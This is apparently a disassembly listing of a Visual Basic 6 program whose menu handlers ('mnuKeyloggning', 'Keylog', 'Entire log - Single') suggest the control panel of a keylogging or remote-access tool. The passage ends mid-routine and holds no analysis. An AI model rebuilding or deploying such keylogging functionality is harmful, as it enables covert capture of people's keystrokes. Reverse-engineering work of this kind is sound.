0074E253: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074E258: mov var_00000118, 008F2010h
0074E262: jmp 74E26Eh
0074E264: mov var_00000118, 008F2010h
0074E26E: push 00000000h
0074E270: push 00000014h
0074E272: push 00440E58h
0074E277: push 00000010h
0074E279: pop eax
0074E27A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074E27F: lea esi, var_00000098
0074E285: mov edi, esp
0074E287: movsd 
0074E288: movsd 
0074E289: movsd 
0074E28A: movsd 
0074E28B: push 00000001h
0074E28D: push 00000000h
0074E28F: push 00440E48h
0074E294: push 00000000h
0074E296: push 00000018h
0074E298: mov eax, var_00000118
0074E29E: mov eax, [eax]
0074E2A0: mov ecx, var_00000118
0074E2A6: mov ecx, [ecx]
0074E2A8: mov ecx, [ecx]
0074E2AA: push eax
0074E2AB: call [ecx+00000550h]
0074E2B1: push eax
0074E2B2: lea eax, var_3C
0074E2B5: push eax
0074E2B6: call 00410A84h ; Set (object)
0074E2BB: push eax
0074E2BC: lea eax, var_54
0074E2BF: push eax
0074E2C0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E2C5: add esp, 00000010h
0074E2C8: push eax
0074E2C9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074E2CE: push eax
0074E2CF: lea eax, var_40
0074E2D2: push eax
0074E2D3: call 00410A84h ; Set (object)
0074E2D8: push eax
0074E2D9: lea eax, var_64
0074E2DC: push eax
0074E2DD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E2E2: add esp, 00000020h
0074E2E5: push eax
0074E2E6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074E2EB: push eax
0074E2EC: lea eax, var_44
0074E2EF: push eax
0074E2F0: call 00410A84h ; Set (object)
0074E2F5: push eax
0074E2F6: lea eax, var_74
0074E2F9: push eax
0074E2FA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E2FF: add esp, 00000010h
0074E302: push eax
0074E303: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074E308: mov edx, eax
0074E30A: lea ecx, var_34
0074E30D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074E312: push eax
0074E313: call 004109DCh ; Val(arg_1)
0074E318: fstp real8 ptr var_000000D0
0074E31E: push 00000000h
0074E320: push 00000000h
0074E322: push 00000001h
0074E324: push 00000000h
0074E326: lea eax, var_00000088
0074E32C: push eax
0074E32D: push 00000010h
0074E32F: push 00000880h
0074E334: call 00410946h ; ReDim
0074E339: add esp, 0000001Ch
0074E33C: mov var_000000A0, 00442930h
0074E346: mov var_000000A8, 00000008h
0074E350: lea esi, var_000000A8
0074E356: push 00000000h
0074E358: push var_00000088
0074E35E: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074E363: mov ecx, eax
0074E365: mov edx, esi
0074E367: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074E36C: mov edx, 0043D564h ; x28
0074E371: lea ecx, var_38
0074E374: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074E379: lea eax, var_00000088
0074E37F: push eax
0074E380: lea eax, var_38
0074E383: push eax
0074E384: fld real8 ptr var_000000D0
0074E38A: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074E38F: push eax
0074E390: call 007A6910h
0074E395: lea eax, var_00000088
0074E39B: push eax
0074E39C: push 00000000h
0074E39E: call 00410934h ; Erase
0074E3A3: lea eax, var_38
0074E3A6: push eax
0074E3A7: lea eax, var_34
0074E3AA: push eax
0074E3AB: push 00000002h
0074E3AD: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074E3B2: add esp, 0000000Ch
0074E3B5: lea eax, var_44
0074E3B8: push eax
0074E3B9: lea eax, var_40
0074E3BC: push eax
0074E3BD: lea eax, var_3C
0074E3C0: push eax
0074E3C1: push 00000003h
0074E3C3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074E3C8: add esp, 00000010h
0074E3CB: lea eax, var_74
0074E3CE: push eax
0074E3CF: lea eax, var_64
0074E3D2: push eax
0074E3D3: lea eax, var_54
0074E3D6: push eax
0074E3D7: push 00000003h
0074E3D9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E3DE: add esp, 00000010h
0074E3E1: mov var_04, 0000000Bh
0074E3E8: lea eax, var_000000F4
0074E3EE: push eax
0074E3EF: lea eax, var_000000E4
0074E3F5: push eax
0074E3F6: lea eax, var_30
0074E3F9: push eax
0074E3FA: call 00410A36h ; Next
0074E3FF: mov var_0000010C, eax
0074E405: cmp var_0000010C, 00000000h
0074E40C: jnz 0074E0F6h
0074E412: mov var_10, 00000000h
0074E419: wait 
0074E41A: push 0074E496h
0074E41F: jmp 74E475h
0074E421: lea eax, var_38
0074E424: push eax
0074E425: lea eax, var_34
0074E428: push eax
0074E429: push 00000002h
0074E42B: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074E430: add esp, 0000000Ch
0074E433: lea eax, var_44
0074E436: push eax
0074E437: lea eax, var_40
0074E43A: push eax
0074E43B: lea eax, var_3C
0074E43E: push eax
0074E43F: push 00000003h
0074E441: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074E446: add esp, 00000010h
0074E449: lea eax, var_00000084
0074E44F: push eax
0074E450: lea eax, var_74
0074E453: push eax
0074E454: lea eax, var_64
0074E457: push eax
0074E458: lea eax, var_54
0074E45B: push eax
0074E45C: push 00000004h
0074E45E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E463: add esp, 00000014h
0074E466: lea eax, var_00000088
0074E46C: push eax
0074E46D: push 00000000h
0074E46F: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074E474: ret 
End Sub

Private sub mnuHelLoggNuvarande__74AC2B
0074AC2B: push ebp
0074AC2C: mov ebp, esp
0074AC2E: sub esp, 00000018h
0074AC31: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074AC36: mov eax, fs:[00h]
0074AC3C: push eax
0074AC3D: mov fs:[00000000h], esp
0074AC44: mov eax, 000000F4h
0074AC49: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074AC4E: push ebx
0074AC4F: push esi
0074AC50: push edi
0074AC51: mov var_18, esp
0074AC54: mov var_14, 00405AB8h
0074AC5B: mov eax, [ebp+08h]
0074AC5E: and eax, 00000001h
0074AC61: mov var_10, eax
0074AC64: mov eax, [ebp+08h]
0074AC67: and al, FEh
0074AC69: mov [ebp+08h], eax
0074AC6C: mov var_0C, 00000000h
0074AC73: mov eax, [ebp+08h]
0074AC76: mov eax, [eax]
0074AC78: push [ebp+08h]
0074AC7B: call [eax+04h]
0074AC7E: mov var_04, 00000001h
0074AC85: mov var_04, 00000002h
0074AC8C: push FFFFFFFFh
0074AC8E: call 00410A60h ; On Error ...
0074AC93: mov var_04, 00000004h
0074AC9A: mov var_70, 00000001h
0074ACA1: mov var_78, 00000002h
0074ACA8: push 004412BCh
0074ACAD: push 00000000h
0074ACAF: push 00000007h
0074ACB1: mov eax, [ebp+08h]
0074ACB4: mov eax, [eax]
0074ACB6: push [ebp+08h]
0074ACB9: call [eax+0000032Ch]
0074ACBF: push eax
0074ACC0: lea eax, var_3C
0074ACC3: push eax
0074ACC4: call 00410A84h ; Set (object)
0074ACC9: push eax
0074ACCA: lea eax, var_54
0074ACCD: push eax
0074ACCE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074ACD3: add esp, 00000010h
0074ACD6: push eax
0074ACD7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074ACDC: push eax
0074ACDD: lea eax, var_40
0074ACE0: push eax
0074ACE1: call 00410A84h ; Set (object)
0074ACE6: mov var_000000A8, eax
0074ACEC: lea eax, var_0000009C
0074ACF2: push eax
0074ACF3: mov eax, var_000000A8
0074ACF9: mov eax, [eax]
0074ACFB: push var_000000A8
0074AD01: call [eax+1Ch]
0074AD04: fclex 
0074AD06: mov var_000000AC, eax
0074AD0C: cmp var_000000AC, 00000000h
0074AD13: jnl 74AD35h
0074AD15: push 0000001Ch
0074AD17: push 004412BCh
0074AD1C: push var_000000A8
0074AD22: push var_000000AC
0074AD28: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074AD2D: mov var_000000F4, eax
0074AD33: jmp 74AD3Ch
0074AD35: and var_000000F4, 00000000h
0074AD3C: mov eax, var_0000009C
0074AD42: mov var_80, eax
0074AD45: mov var_00000088, 00000003h
0074AD4F: mov var_00000090, 00000001h
0074AD59: mov var_00000098, 00000002h
0074AD63: lea eax, var_78
0074AD66: push eax
0074AD67: lea eax, var_00000088
0074AD6D: push eax
0074AD6E: lea eax, var_00000098
0074AD74: push eax
0074AD75: lea eax, var_000000D8
0074AD7B: push eax
0074AD7C: lea eax, var_000000C8
0074AD82: push eax
0074AD83: lea eax, var_30
0074AD86: push eax
0074AD87: call 00410A3Ch ; For
0074AD8C: mov var_000000F0, eax
0074AD92: lea eax, var_40
0074AD95: push eax
0074AD96: lea eax, var_3C
0074AD99: push eax
0074AD9A: push 00000002h
0074AD9C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074ADA1: add esp, 0000000Ch
0074ADA4: lea ecx, var_54
0074ADA7: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074ADAC: jmp 0074AFEBh
0074ADB1: mov var_04, 00000005h
0074ADB8: push 004412BCh
0074ADBD: push 00000000h
0074ADBF: push 00000007h
0074ADC1: mov eax, [ebp+08h]
0074ADC4: mov eax, [eax]
0074ADC6: push [ebp+08h]
0074ADC9: call [eax+0000032Ch]
0074ADCF: push eax
0074ADD0: lea eax, var_3C
0074ADD3: push eax
0074ADD4: call 00410A84h ; Set (object)
0074ADD9: push eax
0074ADDA: lea eax, var_54
0074ADDD: push eax
0074ADDE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074ADE3: add esp, 00000010h
0074ADE6: push eax
0074ADE7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074ADEC: push eax
0074ADED: lea eax, var_40
0074ADF0: push eax
0074ADF1: call 00410A84h ; Set (object)
0074ADF6: mov var_000000A8, eax
0074ADFC: lea eax, var_44
0074ADFF: push eax
0074AE00: lea eax, var_30
0074AE03: push eax
0074AE04: mov eax, var_000000A8
0074AE0A: mov eax, [eax]
0074AE0C: push var_000000A8
0074AE12: call [eax+24h]
0074AE15: fclex 
0074AE17: mov var_000000AC, eax
0074AE1D: cmp var_000000AC, 00000000h
0074AE24: jnl 74AE46h
0074AE26: push 00000024h
0074AE28: push 004412BCh
0074AE2D: push var_000000A8
0074AE33: push var_000000AC
0074AE39: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074AE3E: mov var_000000F8, eax
0074AE44: jmp 74AE4Dh
0074AE46: and var_000000F8, 00000000h
0074AE4D: mov eax, var_44
0074AE50: mov var_000000B0, eax
0074AE56: lea eax, var_34
0074AE59: push eax
0074AE5A: push 00000005h
0074AE5C: mov eax, var_000000B0
0074AE62: mov eax, [eax]
0074AE64: push var_000000B0
0074AE6A: call [eax+00000084h]
0074AE70: fclex 
0074AE72: mov var_000000B4, eax
0074AE78: cmp var_000000B4, 00000000h
0074AE7F: jnl 74AEA4h
0074AE81: push 00000084h
0074AE86: push 004412DCh
0074AE8B: push var_000000B0
0074AE91: push var_000000B4
0074AE97: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074AE9C: mov var_000000FC, eax
0074AEA2: jmp 74AEABh
0074AEA4: and var_000000FC, 00000000h
0074AEAB: push var_34
0074AEAE: push 0044BAE4h ; 100%
0074AEB3: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074AEB8: neg eax
0074AEBA: sbb eax, eax
0074AEBC: inc eax
0074AEBD: neg eax
0074AEBF: mov var_000000B8, ax
0074AEC6: lea ecx, var_34
0074AEC9: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074AECE: lea eax, var_44
0074AED1: push eax
0074AED2: lea eax, var_40
0074AED5: push eax
0074AED6: lea eax, var_3C
0074AED9: push eax
0074AEDA: push 00000003h
0074AEDC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074AEE1: add esp, 00000010h
0074AEE4: lea ecx, var_54
0074AEE7: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074AEEC: movsx eax, word ptr var_000000B8
0074AEF3: test eax, eax
0074AEF5: jz 0074AFC7h
0074AEFB: mov var_04, 00000006h
0074AF02: push 004412BCh
0074AF07: push 00000000h
0074AF09: push 00000007h
0074AF0B: mov eax, [ebp+08h]
0074AF0E: mov eax, [eax]
0074AF10: push [ebp+08h]
0074AF13: call [eax+0000032Ch]
0074AF19: push eax
0074AF1A: lea eax, var_3C
0074AF1D: push eax
0074AF1E: call 00410A84h ; Set (object)
0074AF23: push eax
0074AF24: lea eax, var_54
0074AF27: push eax
0074AF28: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074AF2D: add esp, 00000010h
0074AF30: push eax
0074AF31: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074AF36: push eax
0074AF37: lea eax, var_40
0074AF3A: push eax
0074AF3B: call 00410A84h ; Set (object)
0074AF40: mov var_000000A8, eax
0074AF46: lea edx, var_30
0074AF49: lea ecx, var_64
0074AF4C: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074AF51: lea eax, var_64
0074AF54: push eax
0074AF55: mov eax, var_000000A8
0074AF5B: mov eax, [eax]
0074AF5D: push var_000000A8
0074AF63: call [eax+34h]
0074AF66: fclex 
0074AF68: mov var_000000AC, eax
0074AF6E: cmp var_000000AC, 00000000h
0074AF75: jnl 74AF97h
0074AF77: push 00000034h
0074AF79: push 004412BCh
0074AF7E: push var_000000A8
0074AF84: push var_000000AC
0074AF8A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074AF8F: mov var_00000100, eax
0074AF95: jmp 74AF9Eh
0074AF97: and var_00000100, 00000000h
0074AF9E: lea eax, var_40
0074AFA1: push eax
0074AFA2: lea eax, var_3C
0074AFA5: push eax
0074AFA6: push 00000002h
0074AFA8: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074AFAD: add esp, 0000000Ch
0074AFB0: lea eax, var_64
0074AFB3: push eax
0074AFB4: lea eax, var_54
0074AFB7: push eax
0074AFB8: push 00000002h
0074AFBA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074AFBF: add esp, 0000000Ch
0074AFC2: jmp 0074AC93h
0074AFC7: mov var_04, 00000009h
0074AFCE: lea eax, var_000000D8
0074AFD4: push eax
0074AFD5: lea eax, var_000000C8
0074AFDB: push eax
0074AFDC: lea eax, var_30
0074AFDF: push eax
0074AFE0: call 00410A36h ; Next
0074AFE5: mov var_000000F0, eax
0074AFEB: cmp var_000000F0, 00000000h
0074AFF2: jnz 0074ADB1h
0074AFF8: mov var_04, 0000000Ah
0074AFFF: and [008F23B8h], 00000000h
0074B006: mov var_04, 0000000Bh
0074B00D: fldz 
0074B00F: fstp real8 ptr [008F23BCh]
0074B015: mov var_04, 0000000Ch
0074B01C: fldz 
0074B01E: fstp real8 ptr [008F23ACh]
0074B024: mov var_04, 0000000Dh
0074B02B: lea eax, var_34
0074B02E: push eax
0074B02F: mov eax, [ebp+08h]
0074B032: mov eax, [eax]
0074B034: push [ebp+08h]
0074B037: call [eax+000001C0h]
0074B03D: fclex 
0074B03F: mov var_000000A8, eax
0074B045: cmp var_000000A8, 00000000h
0074B04C: jnl 74B06Eh
0074B04E: push 000001C0h
0074B053: push 00444B74h
0074B058: push [ebp+08h]
0074B05B: push var_000000A8
0074B061: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B066: mov var_00000104, eax
0074B06C: jmp 74B075h
0074B06E: and var_00000104, 00000000h
0074B075: push var_34
0074B078: call 004109DCh ; Val(arg_1)
0074B07D: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074B082: mov [8F23DCh], eax
0074B087: lea ecx, var_34
0074B08A: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074B08F: mov var_04, 0000000Eh
0074B096: lea eax, var_34
0074B099: push eax
0074B09A: mov eax, [ebp+08h]
0074B09D: mov eax, [eax]
0074B09F: push [ebp+08h]
0074B0A2: call [eax+000001C0h]
0074B0A8: fclex 
0074B0AA: mov var_000000A8, eax
0074B0B0: cmp var_000000A8, 00000000h
0074B0B7: jnl 74B0D9h
0074B0B9: push 000001C0h
0074B0BE: push 00444B74h
0074B0C3: push [ebp+08h]
0074B0C6: push var_000000A8
0074B0CC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B0D1: mov var_00000108, eax
0074B0D7: jmp 74B0E0h
0074B0D9: and var_00000108, 00000000h
0074B0E0: push var_34
0074B0E3: call 004109DCh ; Val(arg_1)
0074B0E8: fstp real8 ptr var_000000A4
0074B0EE: cmp [008F2010h], 00000000h
0074B0F5: jnz 74B112h
0074B0F7: push 008F2010h
0074B0FC: push 00433984h
0074B101: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074B106: mov var_0000010C, 008F2010h
0074B110: jmp 74B11Ch
0074B112: mov var_0000010C, 008F2010h
0074B11C: mov eax, var_0000010C
0074B122: mov eax, [eax]
0074B124: mov ecx, var_0000010C
0074B12A: mov ecx, [ecx]
0074B12C: mov ecx, [ecx]
0074B12E: push eax
0074B12F: call [ecx+00000524h]
0074B135: push eax
0074B136: lea eax, var_3C
0074B139: push eax
0074B13A: call 00410A84h ; Set (object)
0074B13F: mov var_000000AC, eax
0074B145: lea eax, var_40
0074B148: push eax
0074B149: fld real8 ptr var_000000A4
0074B14F: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074B154: push eax
0074B155: mov eax, var_000000AC
0074B15B: mov eax, [eax]
0074B15D: push var_000000AC
0074B163: call [eax+40h]
0074B166: fclex 
0074B168: mov var_000000B0, eax
0074B16E: cmp var_000000B0, 00000000h
0074B175: jnl 74B197h
0074B177: push 00000040h
0074B179: push 00440DE8h
0074B17E: push var_000000AC
0074B184: push var_000000B0
0074B18A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B18F: mov var_00000110, eax
0074B195: jmp 74B19Eh
0074B197: and var_00000110, 00000000h
0074B19E: push 00000000h
0074B1A0: push 00000004h
0074B1A2: push var_40
0074B1A5: lea eax, var_54
0074B1A8: push eax
0074B1A9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074B1AE: add esp, 00000010h
0074B1B1: push 00FF00FFh
0074B1B6: push 0044BAF4h ; Entire log - Single
0074B1BB: push 00442864h ; Keylog
0074B1C0: lea eax, var_54
0074B1C3: push eax
0074B1C4: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074B1C9: mov edx, eax
0074B1CB: lea ecx, var_38
0074B1CE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074B1D3: push eax
0074B1D4: call 0074FC42h
0074B1D9: lea eax, var_38
0074B1DC: push eax
0074B1DD: lea eax, var_34
0074B1E0: push eax
0074B1E1: push 00000002h
0074B1E3: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074B1E8: add esp, 0000000Ch
0074B1EB: lea eax, var_40
0074B1EE: push eax
0074B1EF: lea eax, var_3C
0074B1F2: push eax
0074B1F3: push 00000002h
0074B1F5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074B1FA: add esp, 0000000Ch
0074B1FD: lea ecx, var_54
0074B200: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074B205: mov var_04, 0000000Fh
0074B20C: lea eax, var_34
0074B20F: push eax
0074B210: mov eax, [ebp+08h]
0074B213: mov eax, [eax]
0074B215: push [ebp+08h]
0074B218: call [eax+000001C0h]
0074B21E: fclex 
0074B220: mov var_000000A8, eax
0074B226: cmp var_000000A8, 00000000h
0074B22D: jnl 74B24Fh
0074B22F: push 000001C0h
0074B234: push 00444B74h
0074B239: push [ebp+08h]
0074B23C: push var_000000A8
0074B242: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B247: mov var_00000114, eax
0074B24D: jmp 74B256h
0074B24F: and var_00000114, 00000000h
0074B256: push var_34
0074B259: call 004109DCh ; Val(arg_1)
0074B25E: fstp real8 ptr var_000000A4
0074B264: push 00000000h
0074B266: push FFFFFFFFh
0074B268: push 00000000h
0074B26A: push 00000000h
0074B26C: lea eax, var_68
0074B26F: push eax
0074B270: push 00000010h
0074B272: push 00000880h
0074B277: call 00410946h ; ReDim
0074B27C: add esp, 0000001Ch
0074B27F: mov edx, 0043D540h ; x25
0074B284: lea ecx, var_38
0074B287: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074B28C: lea eax, var_68
0074B28F: push eax
0074B290: lea eax, var_38
0074B293: push eax
0074B294: fld real8 ptr var_000000A4
0074B29A: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074B29F: push eax
0074B2A0: call 007A6910h
0074B2A5: lea eax, var_68
0074B2A8: push eax
0074B2A9: push 00000000h
0074B2AB: call 00410934h ; Erase
0074B2B0: lea eax, var_38
0074B2B3: push eax
0074B2B4: lea eax, var_34
0074B2B7: push eax
0074B2B8: push 00000002h
0074B2BA: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074B2BF: add esp, 0000000Ch
0074B2C2: mov var_10, 00000000h
0074B2C9: wait 
0074B2CA: push 0074B338h
0074B2CF: jmp 74B317h
0074B2D1: lea eax, var_38
0074B2D4: push eax
0074B2D5: lea eax, var_34
0074B2D8: push eax
0074B2D9: push 00000002h
0074B2DB: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074B2E0: add esp, 0000000Ch
0074B2E3: lea eax, var_44
0074B2E6: push eax
0074B2E7: lea eax, var_40
0074B2EA: push eax
0074B2EB: lea eax, var_3C
0074B2EE: push eax
0074B2EF: push 00000003h
0074B2F1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074B2F6: add esp, 00000010h
0074B2F9: lea eax, var_64
0074B2FC: push eax
0074B2FD: lea eax, var_54
0074B300: push eax
0074B301: push 00000002h
0074B303: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074B308: add esp, 0000000Ch
0074B30B: lea eax, var_68
0074B30E: push eax
0074B30F: push 00000000h
0074B311: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074B316: ret 
End Sub

Private sub mnuKeyloggning__74D9F1
0074D9F1: push ebp
0074D9F2: mov ebp, esp
0074D9F4: sub esp, 00000018h
0074D9F7: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074D9FC: mov eax, fs:[00h]
0074DA02: push eax
0074DA03: mov fs:[00000000h], esp
0074DA0A: mov eax, 000000D8h
0074DA0F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074DA14: push ebx
0074DA15: push esi
0074DA16: push edi
0074DA17: mov var_18, esp
0074DA1A: mov var_14, 00405D00h
0074DA21: mov eax, [ebp+08h]
0074DA24: and eax, 00000001h
0074DA27: mov var_10, eax
0074DA2A: mov eax, [ebp+08h]
0074DA2D: and al, FEh
0074DA2F: mov [ebp+08h], eax
0074DA32: mov var_0C, 00000000h
0074DA39: mov eax, [ebp+08h]
0074DA3C: mov eax, [eax]
0074DA3E: push [ebp+08h]
0074DA41: call [eax+04h]
0074DA44: mov var_04, 00000001h
0074DA4B: mov var_04, 00000002h
0074DA52: push FFFFFFFFh
0074DA54: call 00410A60h ; On Error ...
0074DA59: mov var_04, 00000003h
0074DA60: mov eax, [ebp+0Ch]
0074DA63: mov ax, [eax]
0074DA66: mov var_000000CC, ax
0074DA6D: movsx eax, word ptr var_000000CC
0074DA74: mov var_000000E8, eax
0074DA7A: cmp var_000000E8, 00000005h
0074DA81: jz 74DA8Dh
0074DA83: jmp 0074DE18h
0074DA88: jmp 0074DE18h
0074DA8D: mov var_04, 00000006h
0074DA94: mov var_68, 00000001h
0074DA9B: mov var_70, 00000002h
0074DAA2: push 004412BCh
0074DAA7: push 00000000h
0074DAA9: push 00000007h
0074DAAB: mov eax, [ebp+08h]
0074DAAE: mov eax, [eax]
0074DAB0: push [ebp+08h]
0074DAB3: call [eax+0000032Ch]
0074DAB9: push eax
0074DABA: lea eax, var_38
0074DABD: push eax
0074DABE: call 00410A84h ; Set (object)
0074DAC3: push eax
0074DAC4: lea eax, var_50
0074DAC7: push eax
0074DAC8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074DACD: add esp, 00000010h
0074DAD0: push eax
0074DAD1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074DAD6: push eax
0074DAD7: lea eax, var_3C
0074DADA: push eax
0074DADB: call 00410A84h ; Set (object)
0074DAE0: mov var_00000098, eax
0074DAE6: lea eax, var_00000094
0074DAEC: push eax
0074DAED: mov eax, var_00000098
0074DAF3: mov eax, [eax]
0074DAF5: push var_00000098
0074DAFB: call [eax+1Ch]
0074DAFE: fclex 
0074DB00: mov var_0000009C, eax
0074DB06: cmp var_0000009C, 00000000h
0074DB0D: jnl 74DB2Fh
0074DB0F: push 0000001Ch
0074DB11: push 004412BCh
0074DB16: push var_00000098
0074DB1C: push var_0000009C
0074DB22: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074DB27: mov var_000000EC, eax
0074DB2D: jmp 74DB36h
0074DB2F: and var_000000EC, 00000000h
0074DB36: mov eax, var_00000094
0074DB3C: mov var_78, eax
0074DB3F: mov var_80, 00000003h
0074DB46: mov var_00000088, 00000001h
0074DB50: mov var_00000090, 00000002h
0074DB5A: lea eax, var_70
0074DB5D: push eax
0074DB5E: lea eax, var_80
0074DB61: push eax
0074DB62: lea eax, var_00000090
0074DB68: push eax
0074DB69: lea eax, var_000000C8
0074DB6F: push eax
0074DB70: lea eax, var_000000B8
0074DB76: push eax
0074DB77: lea eax, var_30
0074DB7A: push eax
0074DB7B: call 00410A3Ch ; For
0074DB80: mov var_000000E4, eax
0074DB86: lea eax, var_3C
0074DB89: push eax
0074DB8A: lea eax, var_38
0074DB8D: push eax
0074DB8E: push 00000002h
0074DB90: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074DB95: add esp, 0000000Ch
0074DB98: lea ecx, var_50
0074DB9B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074DBA0: jmp 0074DDDFh
0074DBA5: mov var_04, 00000007h
0074DBAC: push 004412BCh
0074DBB1: push 00000000h
0074DBB3: push 00000007h
0074DBB5: mov eax, [ebp+08h]
0074DBB8: mov eax, [eax]
0074DBBA: push [ebp+08h]
0074DBBD: call [eax+0000032Ch]
0074DBC3: push eax
0074DBC4: lea eax, var_38
0074DBC7: push eax
0074DBC8: call 00410A84h ; Set (object)
0074DBCD: push eax
0074DBCE: lea eax, var_50
0074DBD1: push eax
0074DBD2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074DBD7: add esp, 00000010h
0074DBDA: push eax
0074DBDB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074DBE0: push eax
0074DBE1: lea eax, var_3C
0074DBE4: push eax
0074DBE5: call 00410A84h ; Set (object)
0074DBEA: mov var_00000098, eax
0074DBF0: lea eax, var_40
0074DBF3: push eax
0074DBF4: lea eax, var_30
0074DBF7: push eax
0074DBF8: mov eax, var_00000098
0074DBFE: mov eax, [eax]
0074DC00: push var_00000098
0074DC06: call [eax+24h]
0074DC09: fclex 
0074DC0B: mov var_0000009C, eax
0074DC11: cmp var_0000009C, 00000000h
0074DC18: jnl 74DC3Ah
0074DC1A: push 00000024h
0074DC1C: push 004412BCh
0074DC21: push var_00000098
0074DC27: push var_0000009C
0074DC2D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074DC32: mov var_000000F0, eax
0074DC38: jmp 74DC41h
0074DC3A: and var_000000F0, 00000000h
0074DC41: mov eax, var_40
0074DC44: mov var_000000A0, eax
0074DC4A: lea eax, var_34
0074DC4D: push eax
0074DC4E: push 00000005h
0074DC50: mov eax, var_000000A0
0074DC56: mov eax, [eax]
0074DC58: push var_000000A0
0074DC5E: call [eax+00000084h]
0074DC64: fclex 
0074DC66: mov var_000000A4, eax
0074DC6C: cmp var_000000A4, 00000000h
0074DC73: jnl 74DC98h
0074DC75: push 00000084h
0074DC7A: push 004412DCh
0074DC7F: push var_000000A0
0074DC85: push var_000000A4
0074DC8B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074DC90: mov var_000000F4, eax
0074DC96: jmp 74DC9Fh
0074DC98: and var_000000F4, 00000000h
0074DC9F: push var_34
0074DCA2: push 0044BAE4h ; 100%
0074DCA7: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074DCAC: neg eax
0074DCAE: sbb eax, eax
0074DCB0: inc eax
0074DCB1: neg eax
0074DCB3: mov var_000000A8, ax
0074DCBA: lea ecx, var_34
0074DCBD: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074DCC2: lea eax, var_40
0074DCC5: push eax
0074DCC6: lea eax, var_3C
0074DCC9: push eax
0074DCCA: lea eax, var_38
0074DCCD: push eax
0074DCCE: push 00000003h
0074DCD0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074DCD5: add esp, 00000010h
0074DCD8: lea ecx, var_50
0074DCDB: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074DCE0: movsx eax, word ptr var_000000A8
0074DCE7: test eax, eax
0074DCE9: jz 0074DDBBh
0074DCEF: mov var_04, 00000008h
0074DCF6: push 004412BCh
0074DCFB: push 00000000h
0074DCFD: push 00000007h
0074DCFF: mov eax, [ebp+08h]
0074DD02: mov eax, [eax]
0074DD04: push [ebp+08h]
